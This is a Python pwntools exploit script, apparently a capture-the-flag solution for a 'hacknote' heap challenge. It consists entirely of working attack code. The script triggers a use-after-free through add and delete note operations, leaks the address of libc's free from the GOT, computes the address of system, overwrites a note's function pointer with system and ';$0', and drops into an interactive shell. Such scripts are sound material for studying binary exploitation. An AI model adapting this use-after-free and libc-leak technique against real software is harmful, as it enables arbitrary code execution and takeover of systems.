from pwn import *

def add(size,data):
    p.recvuntil('Your choice ')
    p.recvuntil(':')
    p.sendline('1')     
    p.recvuntil('Note size ')
    p.recvuntil(':')
    p.sendline(str(size))
    p.recvuntil('Content ')
    p.recvuntil(':')
    p.sendline(data)
 
def delete(index):
    p.recvuntil('Your choice ')
    p.recvuntil(':')
    p.sendline('2')
    p.recvuntil('Index ')
    p.recvuntil(':')
    p.sendline(str(index))
 
def puts(index):
    p.recvuntil('Your choice ')
    p.recvuntil(':')
    p.sendline('3')
    p.recvuntil('Index ')
    p.recvuntil(':')
    p.sendline(str(index))

p=process('./hacknote')
libc=ELF('/lib/i386-linux-gnu/libc-2.27.so')
libc_free_addr=libc.symbols['free']
libc_system_addr=libc.symbols['system']
add(40,'a'*39)
add(40,'b'*39)
delete(0)
delete(1)
add(8,p32(0x804862b)+p32(0x0804A018))
puts(0)
free_addr=u32(p.recv(4))
system_addr=free_addr-(libc_free_addr-libc_system_addr)
delete(2)
add(8,p32(system_addr)+';$0')
puts(0)
p.interactive()
